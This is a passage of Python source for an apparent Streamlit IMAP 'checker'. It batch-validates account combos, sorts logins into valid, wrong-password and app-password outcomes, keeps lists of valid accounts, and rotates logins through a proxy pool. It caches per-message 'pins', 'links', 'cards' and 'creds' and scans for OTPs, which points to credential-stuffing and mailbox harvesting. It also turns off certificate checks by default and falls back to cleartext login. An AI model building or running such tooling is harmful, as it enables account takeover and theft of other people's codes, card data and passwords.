        st.rerun()

    st.caption("Saved to theme.json — the main checker picks it up automatically.")
# @@END 011 SIDEBAR_THEME


# @@BLOCK 012 FILES_AND_CONFIG deps=000
# Persistent Last Account Management & Session Cache
LAST_ACCOUNT_FILE = user_file("last_account.txt")
APP_CONFIG_FILE = user_file("app_config.json")
MANUAL_VALID_FILE = user_file("manual_valid_accounts.txt")
SESSION_CACHE_FILE = user_file("session_cache.json")

# The reader's own UI store. Every setting, toggle, slider and per-mail body edit
# lands here, per user, so a reload restores the panel instead of the factory
# defaults. Body edits are keyed by SCOPE (account|folder|mode|page) and only the
# current scope is kept, so switching mail clears the previous mail.
READER_UI_FILE = user_file("reader_ui.json")

DEFAULT_APP_CONFIG = {
    "connection_timeout": 15,
    "imap_port": 993,
    "auto_fallback_probing": True,
    "max_batch_retries": 1,
    "try_starttls": True,
    "try_alt_username": True,
    "allow_self_signed": True,
}

def load_app_config():
    if os.path.exists(APP_CONFIG_FILE):
        try:
            with open(APP_CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                config = DEFAULT_APP_CONFIG.copy()
                config.update(data)
                return config
        except Exception:
            pass
    return DEFAULT_APP_CONFIG.copy()

def save_app_config(config_dict):
    try:
        with open(APP_CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config_dict, f, indent=2)
    except Exception:
        pass

def save_last_account(account_combo):
    try:
        with open(LAST_ACCOUNT_FILE, "w", encoding="utf-8") as f:
            f.write(account_combo)
    except Exception:
        pass

def load_last_account():
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            with open(LAST_ACCOUNT_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            pass
    return ""

def save_session_cache():
    try:
        cache_data = {
            "connected_account_combo": st.session_state.get("connected_account_combo", ""),
            "mb_host": st.session_state.get("mb_host", ""),
            "mb_folders": st.session_state.get("mb_folders", ["INBOX"]),
            "folder_map": st.session_state.get("folder_map", {"INBOX": "INBOX"}),
            "current_page": st.session_state.get("current_page", 1),
            "search_current_page": st.session_state.get("search_current_page", 1),
            "otp_current_page": st.session_state.get("otp_current_page", 1),
            "bot_current_page": st.session_state.get("bot_current_page", 1),
            "bot_filter_mode": st.session_state.get("bot_filter_mode", False),
            "total_matched_count": st.session_state.get("total_matched_count", 0),
            "search_total_matched_count": st.session_state.get("search_total_matched_count", 0),
            "otp_total_matched_count": st.session_state.get("otp_total_matched_count", 0),
            # the selected folder travels with the page counter. Without it a
            # restored page number pointed into a folder that was no longer
            # selected, so the pager fetched the wrong mailbox.
            "folder_sel": st.session_state.get("folder_sel", ""),
            "sort_order_sel": st.session_state.get("sort_order_sel", "Newest First"),
        }

        # raw/body/body_raw are persisted so a restored page does not have to
        # re-fetch a mailbox to show a message. `raw` is bytes, so it is
        # base64-encoded here - json.dump cannot take bytes.
        # 60 -> 40 rows: each carries a base64 blob and the file was rewritten
        # every 2s during a fetch.
        MAX_CACHED = 40
        KEEP_KEYS = {
            "id", "folder", "from", "to", "subject", "date",
            "is_read", "is_bot", "categories", "flags", "size_bytes",
            "pins", "links", "cards", "creds",
            "raw", "body", "body_raw",
        }
        for k_name, key_in_state in [
            ("current_messages", "current_messages"),
            ("otp_messages", "otp_messages"),
            ("search_messages", "search_messages"),
        ]:
            serialized_list = []
            for m in st.session_state.get(key_in_state, [])[:MAX_CACHED]:
                m_copy = {k: v for k, v in m.items() if k in KEEP_KEYS}
                if isinstance(m_copy.get("raw"), (bytes, bytearray)):
                    m_copy["raw"] = base64.b64encode(bytes(m_copy["raw"])).decode("ascii")
                serialized_list.append(m_copy)
            cache_data[k_name] = serialized_list

        tmp = SESSION_CACHE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(cache_data, f, separators=(",", ":"))
        os.replace(tmp, SESSION_CACHE_FILE)
    except Exception:
        pass

def load_session_cache():
    if os.path.exists(SESSION_CACHE_FILE):
        try:
            with open(SESSION_CACHE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                for k, v in data.items():
                    if k in ["current_messages", "otp_messages", "search_messages"]:
                        deserialized = []
                        for m in v:
                            m_copy = m.copy()
                            raw_val = m_copy.get("raw")
                            if isinstance(raw_val, str) and raw_val:
                                try:
                                    m_copy["raw"] = base64.b64decode(raw_val.encode("ascii"))
                                except Exception:
                                    m_copy["raw"] = b""
                            else:
                                m_copy["raw"] = b""
                            deserialized.append(m_copy)
                        st.session_state[k] = deserialized
                    else:
                        st.session_state[k] = v
        except Exception:
            pass


# ============================================================================
# READER UI STORE
# ============================================================================
# Streamlit throws session_state away when the WebSocket drops - a reload, a tab
# restored from the background, a redeploy. Every control on this page therefore
# has to be seeded from disk BEFORE its widget is created, or the panel comes
# back at factory defaults while the loaded messages come back intact.
#
# The whitelist below is the whole contract: only these keys are written, and
# only these are read back. A key that is not here cannot leak into the file.
_UI_BODY_PREFIXES = ("body_", "otp_b_", "s_body_")

_UI_FLAGS = ("mv_remote", "hub_otp_open", "hub_search_open", "hub_bot_open",
             "otp_clean_toggle", "otp_regex_chk", "otp_all_folders",
             "deep_all_folders", "bot_filter_mode")

_UI_TEXT = ("otp_custom_kw", "otp_blacklist_kw", "deep_search_query",
            "deep_search_blacklist_kw", "folder_sel", "mv_view")

_UI_PICK = ("otp_search_field", "deep_search_field", "sort_order_sel")

_UI_NUMS = {
    "ui_font_size": (12, 22, 16),
    "ui_content_scale": (80, 140, 100),
    "page_size_sel": (5, 200, 15),
    "stream_page_size": (5, 200, 15),
    "otp_page_size_slider": (5, 200, 15),
    "search_page_size_slider": (5, 200, 15),
    "bot_page_size_slider": (5, 200, 15),
    "bot_scan_depth": (1, 5000, 100),
}

_UI_LISTS = ("otp_scan_scope", "deep_search_scope", "bot_hub_folder_select")

# `owner` is the unlocked hash. The writer, the valid-list cache and the ZIP
# cache are all process values, so they must be reset when a DIFFERENT user's run
# reaches them - otherwise one user's write suppresses the other's.
_UI_WRITE = {"owner": None, "t": 0.0, "sig": None, "err": "", "paused": 0}


def _ui_owner():
    try:
        return user_file("")
    except Exception:
        return ""


def _ui_bool(v, default=False):
    if isinstance(v, bool):
        return v
    if isinstance(v, (int, float)):
        return bool(v)
    s = str(v).strip().lower()
    if s in ("1", "true", "yes", "on"):
        return True
    if s in ("0", "false", "no", "off", ""):
        return False
    return default


def _ui_int(v, lo, hi, default):
    try:
        n = int(float(v))
    except (TypeError, ValueError):
        return default
    return max(lo, min(hi, n))


def _ui_text(v, default=""):
    if isinstance(v, str):
        return v
    return default if v is None else str(v)


def _ui_list(v, options, default):
    if not isinstance(v, list):
        return list(default)
    keep = [x for x in v if isinstance(x, str) and x in options]
    return keep or list(default)


def _ui_folder_options():
    folders = st.session_state.get("mb_folders") or ["INBOX"]
    return ["INBOX"] + [f for f in folders if f != "INBOX"]


def _ui_body_keys():
    return [k for k in list(st.session_state)
            if isinstance(k, str) and k.startswith(_UI_BODY_PREFIXES)]


def _reader_ui_load() -> dict:
    if not os.path.exists(READER_UI_FILE):
        return {}
    try:
        with open(READER_UI_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _reader_ui_restore() -> None:
    """Seed session_state from disk. ONCE per session, before any widget exists.

    Overwrite-versus-skip is the whole point. On a rerun the LIVE widget value
    must win, or every slider snaps back to whatever was on disk when the run
    started and the control can never move. So the file is read on the first run
    only, and even then a key that a widget already owns this run has to be
    FORCED: bot_filter_mode is initialised in block 013, and the Display Fit pair
    is written by auth.fit() in block 001 - a plain "only seed missing keys"
    restore can never reach any of them.
    """
    if st.session_state.get("_ui_restored"):
        return
    data = _reader_ui_load()
    st.session_state["_ui_restored"] = True
    if not data:
        return
    settings = data.get("settings")
    if isinstance(settings, dict):
        # ---- keys a widget already owns this run: FORCE -------------------
        if "bot_filter_mode" in settings:
            st.session_state["bot_filter_mode"] = _ui_bool(settings.get("bot_filter_mode"), False)
        for k in ("ui_font_size", "ui_content_scale"):
            if k in settings:
                lo, hi, dflt = _UI_NUMS[k]
                st.session_state[k] = _ui_int(settings.get(k), lo, hi, dflt)
        # ---- everything else: seed only what is still missing -------------
        for k in _UI_FLAGS:
            if k in settings and k not in st.session_state:
                st.session_state[k] = _ui_bool(settings.get(k), False)
        for k in _UI_TEXT:
            if k in settings and k not in st.session_state:
                st.session_state[k] = _ui_text(settings.get(k))
        for k, (lo, hi, dflt) in _UI_NUMS.items():
            if k in settings and k not in st.session_state:
                st.session_state[k] = _ui_int(settings.get(k), lo, hi, dflt)
        for k in _UI_LISTS:
            if k in settings and k not in st.session_state:
                st.session_state[k] = _ui_list(settings.get(k), _ui_folder_options(), ["INBOX"])

    scope = data.get("scope") or ""
    bodies = data.get("bodies")
    bodies = bodies if isinstance(bodies, dict) else {}
    if "_reader_bodies" not in st.session_state:
        st.session_state["_reader_bodies"] = bodies
    if scope and "_reader_scope" not in st.session_state:
        st.session_state["_reader_scope"] = scope
        for k, v in (bodies.get(scope) or {}).items():
            if isinstance(k, str) and isinstance(v, str) and k not in st.session_state:
                st.session_state[k] = v


def _reader_ui_snapshot() -> dict:
    out = {}
    for k in _UI_FLAGS:
        out[k] = bool(st.session_state.get(k, False))
    for k in _UI_TEXT:
        v = st.session_state.get(k)
        if isinstance(v, str):
            out[k] = v
    for k in _UI_PICK:
        v = st.session_state.get(k)
        if isinstance(v, str):
            out[k] = v
    for k in _UI_NUMS:
        v = st.session_state.get(k)
        if isinstance(v, (int, float)):
            out[k] = int(v)
    for k in _UI_LISTS:
        v = st.session_state.get(k)
        if isinstance(v, list):
            out[k] = [x for x in v if isinstance(x, str)]
    return out


def _reader_ui_save(force: bool = False) -> None:
    """Write the panel + the current mail's body edits. Throttled and deduped."""
    if _UI_WRITE["paused"] > 0 and not force:
        return
    try:
        owner = _ui_owner()
        if _UI_WRITE["owner"] != owner:
            # a different user reached this process value - reset the memo
            _UI_WRITE["owner"] = owner
            _UI_WRITE["sig"] = None
        scope = st.session_state.get("_reader_scope", "")
        bodies = {}
        if scope:
            cur = {k: st.session_state[k] for k in _ui_body_keys()
                   if isinstance(st.session_state.get(k), str)}
            if cur:
                bodies[scope] = cur
        payload = {"v": 1, "settings": _reader_ui_snapshot(),
                   "scope": scope, "bodies": bodies}
        blob = json.dumps(payload, sort_keys=True, separators=(",", ":"))
        now = time.time()
        if not force and blob == _UI_WRITE["sig"]:
            return
        if not force and now - _UI_WRITE["t"] < 1.0:
            return
        tmp = READER_UI_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            f.write(blob)
        os.replace(tmp, READER_UI_FILE)
        _UI_WRITE["sig"] = blob
        _UI_WRITE["t"] = now
        _UI_WRITE["err"] = ""
    except Exception as ex:
        _UI_WRITE["err"] = str(ex)


def _reader_scope_apply(scope: str) -> None:
    """Focus a mail scope. A different scope clears the previous mail's edits."""
    prev = st.session_state.get("_reader_scope")
    st.session_state["_reader_scope"] = scope
    if prev == scope:
        return
    for k in _ui_body_keys():
        st.session_state.pop(k, None)
    store = st.session_state.get("_reader_bodies")
    store = store if isinstance(store, dict) else {}
    keep = store.get(scope) or {}
    st.session_state["_reader_bodies"] = {scope: keep} if keep else {}
    for k, v in keep.items():
        if isinstance(k, str) and isinstance(v, str):
            st.session_state[k] = v
# @@END 012 FILES_AND_CONFIG


# @@BLOCK 013 SESSION_INIT deps=012
# Initialize Session Config
if "app_config" not in st.session_state:
    st.session_state.app_config = load_app_config()

# Initialize Isolated Session State Variables & Restore Session Cache on first load
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
    load_session_cache()

if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "folder_map" not in st.session_state:
    st.session_state.folder_map = {"INBOX": "INBOX"}
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 1
if "search_current_page" not in st.session_state:
    st.session_state.search_current_page = 1
if "otp_current_page" not in st.session_state:
    st.session_state.otp_current_page = 1
if "bot_current_page" not in st.session_state:
    st.session_state.bot_current_page = 1
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []
if "bot_diag_logs" not in st.session_state:
    st.session_state.bot_diag_logs = []
if "search_diag_logs" not in st.session_state:
    st.session_state.search_diag_logs = []
if "otp_diag_logs" not in st.session_state:
    st.session_state.otp_diag_logs = []
if "current_messages" not in st.session_state:
    st.session_state.current_messages = []
if "search_messages" not in st.session_state:
    st.session_state.search_messages = []
if "otp_messages" not in st.session_state:
    st.session_state.otp_messages = []
if "total_matched_count" not in st.session_state:
    st.session_state.total_matched_count = 0
if "search_total_matched_count" not in st.session_state:
    st.session_state.search_total_matched_count = 0
if "otp_total_matched_count" not in st.session_state:
    st.session_state.otp_total_matched_count = 0
if "bot_filter_mode" not in st.session_state:
    st.session_state.bot_filter_mode = False
if "custom_email" not in st.session_state:
    st.session_state.custom_email = ""
if "custom_pass" not in st.session_state:
    st.session_state.custom_pass = ""
if "custom_host" not in st.session_state:
    st.session_state.custom_host = ""
if "batch_results_table" not in st.session_state:
    st.session_state.batch_results_table = []
if "batch_validation_logs" not in st.session_state:
    st.session_state.batch_validation_logs = []
if "batch_stats" not in st.session_state:
    st.session_state.batch_stats = {"valid": 0, "wrong": 0, "appass": 0, "failed": 0}
if "batch_run_meta" not in st.session_state:
    st.session_state.batch_run_meta = None
if "active_mail" not in st.session_state:
    st.session_state.active_mail = None
if "connected_account_combo" not in st.session_state:
    st.session_state.connected_account_combo = ""
if "reader_use_proxy" not in st.session_state:
    st.session_state.reader_use_proxy = False
if "stream_page_size" not in st.session_state:
    st.session_state.stream_page_size = 15
if "stream_page_rows" not in st.session_state:
    st.session_state.stream_page_rows = 0
if "search_page_rows" not in st.session_state:
    st.session_state.search_page_rows = 0
if "otp_page_rows" not in st.session_state:
    st.session_state.otp_page_rows = 0

# Seed the whole panel from disk. LAST statement of the block on purpose -
# mb_folders exists now, so the scope multiselects can be validated against the
# real folder list before their widgets are built.
_reader_ui_restore()
# @@END 013 SESSION_INIT


# @@BLOCK 014 LOGGERS deps=013
# log() rewrote the entire session cache - 40 messages with base64 raw blobs - on
# every single line. Throttled to one write per 2s, and PAUSED entirely while a
# fetch loop runs: 15 log lines inside one 300 ms fetch still tripped the 2 s
# throttle once and wrote megabytes to disk mid-loop, which is what made a search
# stall. The loop writes once, at the end.
_LAST_CACHE_WRITE = {"t": 0.0}
_CACHE_PAUSE = {"n": 0}


def _cache_pause():
    _CACHE_PAUSE["n"] += 1
    _UI_WRITE["paused"] += 1


def _cache_resume():
    _CACHE_PAUSE["n"] = max(0, _CACHE_PAUSE["n"] - 1)
    _UI_WRITE["paused"] = max(0, _UI_WRITE["paused"] - 1)
    if _CACHE_PAUSE["n"] == 0:
        save_session_cache()


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]
    if _CACHE_PAUSE["n"] > 0:
        return
    _now = time.time()
    if _now - _LAST_CACHE_WRITE.get("t", 0.0) >= 2.0:
        _LAST_CACHE_WRITE["t"] = _now
        save_session_cache()

# diagnostic logs grew without limit for the whole session.
_DIAG_CAP = 400
# and every run rendered all of them into one st.code block.
_DIAG_RENDER = 250


def _diag(bucket: str, msg: str) -> None:
    lst = st.session_state.get(bucket)
    if lst is None:
        st.session_state[bucket] = [msg]
        return
    lst.append(msg)
    if len(lst) > _DIAG_CAP:
        head = lst[:1]
        lst[:] = head + lst[len(lst) - (_DIAG_CAP - 1):]


def diag_text(bucket: str) -> str:
    """Newest _DIAG_RENDER lines, with the trimmed count stated."""
    lines = st.session_state.get(bucket) or []
    if len(lines) > _DIAG_RENDER:
        cut = len(lines) - _DIAG_RENDER
        lines = [f"[... {cut} earlier line(s) trimmed ...]"] + lines[-_DIAG_RENDER:]
    return "\n".join(lines)


def debug_log(msg):
    _diag("folder_debug_logs", msg)


def bot_log(msg):
    _diag("bot_diag_logs", msg)


def search_log(msg):
    _diag("search_diag_logs", msg)


def otp_log(msg):
    _diag("otp_diag_logs", msg)


def flash(msg: str, kind: str = "success") -> None:
    """st.success() before st.rerun() is thrown away by the rerun.
    Queue it, show it at the top of the next run."""
    st.session_state.setdefault("_flash", []).append((kind, msg))


def msg_label(msg, idx: int) -> str:
    """Raw subjects with newlines / huge length wreck the expander row."""
    icon = "📖" if msg.get("is_read") else "📩"
    subj = re.sub(r"\s+", " ", str(msg.get("subject", ""))).strip()[:90] or "(no subject)"
    frm = re.sub(r"\s+", " ", str(msg.get("from", ""))).strip()[:45] or "(unknown)"
    date = re.sub(r"\s+", " ", str(msg.get("date", ""))).strip()[:31]
    cats = "".join(f" [{c}]" for c in msg.get("categories", []))
    return f"{icon} [{msg.get('folder', '?')}] [{date}] {frm} — {subj}{cats}"


def render_flash() -> None:
    for kind, msg in st.session_state.pop("_flash", []):
        {"success": st.success, "warning": st.warning, "error": st.error}.get(kind, st.info)(msg)


# bucket -> the ONE counter that bucket drives. The first version decremented
# total_matched_count for every bucket, so deleting an OTP row dropped the main
# stream's pager.
_DROP_COUNTER = {
    "current_messages": "total_matched_count",
    "search_messages": "search_total_matched_count",
    "otp_messages": "otp_total_matched_count",
}


def drop_msg(bucket: str, msg) -> None:
    """Remove one row without raising when it is already gone.

    `list.remove()` raises ValueError on a row a restored cache had duplicated or
    that an earlier press already dropped, and the handler around it reported
    that as a failed delete.
    """
    lst = st.session_state.get(bucket)
    if not isinstance(lst, list):
        return
    try:
        lst.remove(msg)
    except ValueError:
        for i, m in enumerate(lst):
            if m.get("id") == msg.get("id") and m.get("folder") == msg.get("folder"):
                del lst[i]
                break
    counter = _DROP_COUNTER.get(bucket)
    if counter:
        n = st.session_state.get(counter)
        if isinstance(n, int) and n > 0:
            st.session_state[counter] = n - 1
# @@END 014 LOGGERS


# @@BLOCK 015 TLS_AND_PROXY_PARSE deps=013
# ============================================================================
# CONNECTION LAYER
#
# The proxy IMAP classes override _create_socket(), NOT open(): on Python
# 3.13+ imaplib.IMAP4.file is a read-only property, so assigning self.file
# inside an open() override raises
#     property 'file' of '_ProxyIMAP4' object has no setter
# ============================================================================

def _cfg_verify() -> bool:
    """v13.39: the page's ALLOW_SELF_SIGNED setting, finally read.

    app_config["allow_self_signed"] existed in DEFAULT_APP_CONFIG and was used by
    NOTHING - both TLS rungs hardcoded verify=False.  Unticked now means a real
    verification, so an expired / mismatched certificate is actually rejected.
    """
    try:
        return not bool(st.session_state.app_config.get("allow_self_signed", True))
    except Exception:
        return False

def _mail_tls_context(verify=False):
    """verify=False tolerates self-signed / expired / hostname-mismatched certs."""
    if verify:
        ctx = _ssl.create_default_context()
    else:
        ctx = _ssl._create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
    try:
        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')   # old cPanel / SHA-1 / 1024-bit RSA
    except Exception:
        pass
    return ctx

def _parse_proxy_str(proxy_str):
    """Accepts host:port | host:port:user:pass | user:pass@host:port | scheme://...

    v13.47: the userinfo half used to be a local named `auth`, shadowing the
    `auth` MODULE this page imports.  Inside this function `auth.require` was an
    AttributeError, and verify_v1337.py reported `auth.split` as a call to a
    function the module does not have.  It is `userinfo` now.
    """
    if not proxy_str or proxy_str == "direct":
        return None
    try:
        p = str(proxy_str).strip()
        scheme = None
        if "://" in p:
            scheme, p = p.split("://", 1)
            scheme = scheme.lower()

        user = pw = None
        if "@" in p:
            userinfo, p = p.rsplit("@", 1)
            if ":" in userinfo:
                user, pw = userinfo.split(":", 1)
            else:
                user = userinfo

        parts = p.split(":")
        host = None
        port = None
        try:
            if len(parts) >= 4:
                host, port, user, pw = parts[0], int(parts[1]), parts[2], ":".join(parts[3:])
            elif len(parts) == 3:
                host, port, extra = parts[0], int(parts[1]), parts[2]
                if user is None:
                    user, pw = extra, None
            elif len(parts) == 2:
                host, port = parts[0], int(parts[1])
            else:
                return None
        except (ValueError, IndexError):
            return None

        if not host or not port:
            return None
        return {"host": host, "port": port, "user": user or None, "pass": pw or None, "scheme": scheme}
    except Exception:
        return None
# @@END 015 TLS_AND_PROXY_PARSE


# @@BLOCK 016 PROXY_PROBE deps=015
# ---------------------------------------------------------------------------
# v13.37: probe + rotate instead of blindly taking pool[0], and report the path
# ---------------------------------------------------------------------------
def _reader_proxy_reachable(proxy_str, host, port=993, timeout=5.0) -> bool:
    """True if a SOCKS5/HTTP CONNECT to host:port through this node succeeds."""
    info = _parse_proxy_str(proxy_str)
    if not info:
        return False
    try:
        import socks
    except ImportError:
        return False
    for _ptype in (socks.SOCKS5, socks.HTTP):
        s = None
        try:
            s = socks.socksocket()
            s.set_proxy(_ptype, info["host"], info["port"],
                        username=info.get("user"), password=info.get("pass"),
                        rdns=True)
            s.settimeout(timeout)
            s.connect((host, int(port)))
            return True
        except Exception:
            continue
        finally:
            # v13.40: failed probes leaked their socket.
            if s is not None:
                try:
                    s.close()
                except Exception:
                    pass
    return False

def _reader_proxy_str(host: str = "", port=None):
    """Optional proxy for manual reader connections (sidebar toggle).

    v13.37: tries each pool entry against the real target host and returns the
    first one that connects, instead of returning pool[0] and hoping.
    Records the outcome in st.session_state["_reader_proxy_path"] so the UI can
    state the truth rather than guess.
    """
    try:
        if not st.session_state.get("reader_use_proxy", False):
            st.session_state["_reader_proxy_path"] = "direct (proxy toggle OFF)"
            return None
        pool = load_app_proxies()
        if not pool:
            st.session_state["_reader_proxy_path"] = "direct (no pool)"
            return None
        target = host or "imap.gmail.com"
        # v13.40: the probe hardcoded 993, so a port-143 account probed the wrong
        # port, failed every node and silently went direct. Use the real port.
        probe_port = int(port or st.session_state.app_config.get("imap_port", 993) or 993)
        for item in pool[:5]:
            px = item.get("proxy")
            if not px:
                continue
            if _reader_proxy_reachable(px, target, probe_port, timeout=3.0):
                st.session_state["_reader_proxy_path"] = f"via {px} ({item.get('country')})"
                return px
        st.session_state["_reader_proxy_path"] = "direct (every probed node failed)"
        return None
    except Exception:
        st.session_state["_reader_proxy_path"] = "direct (probe error)"
        return None

def _conn_path() -> str:
    try:
        return st.session_state.get("_reader_proxy_path", "unknown")
    except Exception:
        return "unknown"
# @@END 016 PROXY_PROBE


# @@BLOCK 017 SOCKET_AND_IMAP deps=016
def _raw_socket(host, port, timeout, proxy_str=None):
    """Direct socket, or proxied via SOCKS5/HTTP. Falls back to direct if the
    proxy route dies, so a live mailbox is never lost to a dead proxy."""
    info = _parse_proxy_str(proxy_str)

    def _finish(s):
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except Exception:
            pass
        s.settimeout(timeout)
        return s

    if not info:
        return _finish(socket.create_connection((host, int(port)), timeout=timeout))

    try:
        import socks
    except ImportError:
        return _finish(socket.create_connection((host, int(port)), timeout=timeout))

    scheme = (info.get("scheme") or "").lower()
    if scheme.startswith("socks"):
        order = (socks.SOCKS5, socks.HTTP)
    elif scheme.startswith("http"):
        order = (socks.HTTP, socks.SOCKS5)
    else:
        order = (socks.SOCKS5, socks.HTTP)

    last = None
    for ptype in order:
        try:
            kw = {
                "proxy_type": ptype,
                "proxy_addr": info["host"],
                "proxy_port": info["port"],
                "proxy_rdns": True,          # let the proxy resolve DNS
            }
            if info["user"]:
                kw["proxy_username"] = info["user"]
                kw["proxy_password"] = info["pass"]
            _s = _finish(socks.create_connection((host, int(port)), timeout=timeout, **kw))
            try:
                st.session_state["_last_socket_path"] = "proxied"
            except Exception:
                pass
            return _s
        except Exception as e:
            last = e

    # Last resort: go direct rather than losing the mailbox entirely.
    try:
        _s = _finish(socket.create_connection((host, int(port)), timeout=timeout))
        try:
            # v13.40: the silent direct fallback made every proxy report a lie.
            st.session_state["_last_socket_path"] = "direct (proxy failed, fell back)"
        except Exception:
            pass
        return _s
    except Exception:
        raise last or RuntimeError(f"proxy connect failed for {host}:{port}")

def _ensure_file(m):
    """Belt-and-braces: make sure m.file is readable on every Python version."""
    try:
        if getattr(m, "file", None) is not None:
            return
    except Exception:
        pass
    try:
        m.file = m.sock.makefile("rb")
        return
    except Exception:
        pass
    try:
        m._file = m.sock.makefile("rb")
    except Exception:
        pass

class _ProxyIMAP4SSL(imaplib.IMAP4_SSL):
    """Implicit-TLS IMAP that routes through the proxy and uses an unverified
    context by default. Overrides _create_socket(), NOT open()."""

    def __init__(self, host, port=993, timeout=None, proxy_str=None, verify=False):
        self._proxy_str = proxy_str
        self._verify = verify
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        raw = _raw_socket(self.host, self.port, timeout, self._proxy_str)
        return _mail_tls_context(self._verify).wrap_socket(raw, server_hostname=self.host)

class _ProxyIMAP4(imaplib.IMAP4):
    """Plain IMAP (STARTTLS-capable) with proxy support."""

    def __init__(self, host, port=143, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, timeout, self._proxy_str)

class _XOAUTH2IMAP4SSL(_ProxyIMAP4SSL):
    """Adapter so ms_oauth's uniform `insecure=` kwarg reaches _ProxyIMAP4SSL,
    which spells the same flag `verify=`."""

    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=True):
        super().__init__(host, port=port, timeout=timeout,
                         proxy_str=proxy_str, verify=not insecure)

def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
    """v13.37: the ladder is built from the CONFIGURED port.

    Before, the STARTTLS and plaintext rungs were gated on int(port) == 993, so
    a port-143 account dialled implicit TLS on 143 and then gave up entirely.
    The plaintext rung still matters: legacy / Zimbra servers answer
    'TLS not supported by server' on 143 but accept a cleartext LOGIN.

    v13.39: the certificate policy comes from app_config["allow_self_signed"]
    instead of being hardcoded to verify=False in both rungs.
    """
    if try_starttls is None:
        try_starttls = bool(st.session_state.app_config.get("try_starttls", True))
    _verify = _cfg_verify()

    port = int(port or 993)
    if port == 143:
        ladder = [("starttls", 143), ("plain", 143), ("implicit", 993)]
    else:
        ladder = [("implicit", port), ("starttls", 143), ("plain", 143)]

    last = None
    for mode, p in ladder:
        if mode == "starttls" and not try_starttls:
            continue                       # v13.40: skip BEFORE dialling
        m = None
        try:
            if mode == "implicit":
                m = _ProxyIMAP4SSL(host, p, timeout=timeout, proxy_str=proxy_str, verify=_verify)
            else:
                m = _ProxyIMAP4(host, p, timeout=timeout, proxy_str=proxy_str)
                if mode == "starttls":
                    m.starttls(ssl_context=_mail_tls_context(_verify))
            _ensure_file(m)
            return m
        except Exception as e:
            last = e
            if m is not None:
                # v13.40: a failed rung never closed its socket -> fd leak.
                try:
                    m.shutdown()
                except Exception:
                    try:
                        if getattr(m, "sock", None):
                            m.sock.close()
                    except Exception:
                        pass

    raise last or RuntimeError(f"open_imap failed for {host}:{port}")
# @@END 017 SOCKET_AND_IMAP


# @@BLOCK 018 ERROR_SNIFFERS deps=017
def _looks_like_auth_error(err_text: str) -> bool:
    s = (err_text or "").lower()
    return any(k in s for k in (
        "authenticationfailed", "authentication failed", "invalid credentials",
        "invalid login", "invalid password", "invalid user", "login failed",
        "auth failed", "[auth]", "username and password not accepted",
        "logon failure", "bad username", "authenticate failed",
    ))

def _looks_like_login_drop(err_text: str) -> bool:
    """v13.39: the reader had no idea about the * BYE the engine learned in
    v13.38, so a server that answered then hung up was filed as plain FAILED."""
    s = (err_text or "").lower()
    if any(k in s for k in ("too many", "limit", "quota", "busy", "throttle")):
        return False                       # that is a rate cap, not a rate drop
    return any(k in s for k in (
        "terminating connection", "imap server terminating", "server terminating",
        "* bye", " bye ", "auth process broken", "connection is closed",
        "server closed the connection", "server dropped the connection",
    ))

def _looks_like_app_password_error(err_text: str) -> bool:
    s = (err_text or "").lower()
    return any(k in s for k in (
        "application-specific password", "app password", "app-password",
        "app password required", "basic authentication is disabled",
        "web login required", "log in via your web browser", "web browser",
        "logindisabled", "login disabled", "two-factor", "2fa", "mfa",
        "enable imap", "imap access is disabled",
    ))

def _looks_like_network_error(err_text: str) -> bool:
    s = (err_text or "").lower()
    return any(k in s for k in (
        "proxy connect", "proxy authentication", "proxy auth", "proxyconnect",
        "407", "timed out", "timeout", "connection refused", "connection reset",
        "network is unreachable", "name or service not known", "gaierror",
        "reset by peer", "broken pipe", "no route to host", "unreachable",
        "bad file descriptor", "eof occurred", "unexpected_eof",
        "wrong version number", "certificate verify failed", "hostname mismatch",
        "self signed certificate", "self-signed certificate", "too many connections",
        "too many simultaneous", "rate limit", "ratelimit", "throttl", "no setter",
        "name resolution", "getaddrinfo", "temporary failure in name resolution",
    ))
# @@END 018 ERROR_SNIFFERS


# @@BLOCK 019 VALID_STORAGE deps=018
# ============================================================================
# VALID ACCOUNT STORAGE  (per-user isolation)
# ============================================================================
# READING AND DELETING ARE NOT THE SAME QUESTION.
#   _own()        - "may I show this?"  A bare, unprefixed file is legacy and
#                   genuinely shared, so it stays readable here, in the valid list
#                   and in the ZIP. That is deliberate.
#   _own_strict() - "may I REWRITE this?"  Only this user's own prefix.
_HASH_RX = re.compile(r"^(?:anon)?[0-9a-f]{16}_")
_RES_DIR = user_file("mail_results")
CLEAN_VALID_FILE = user_file("clean_valid_accounts.txt")

_VALID_FILE_PATTERNS = [
    os.path.join(_RES_DIR, "*valid*.txt"),
    os.path.join(_RES_DIR, "*clean*.txt"),
    "*valid*.txt",
    "*clean*.txt",
]
_VALID_IGNORE = ["resume", "unfinished", "remaining", "input", "proxies", "proxy", "config", "blocklist"]

_META_TAGS = ("found:", "proxy:", "path:", "xoauth2", "no standard", "aadsts",
              "http ", "imap.", "retry", "row-level", "rejected before")

# The fingerprint is (path, mtime, size) for every candidate file, so computing
# it costs a glob + a stat per file - on every rerun, before the cache is even
# consulted. load_valid() and generate_all_mail_zip() both call it at module
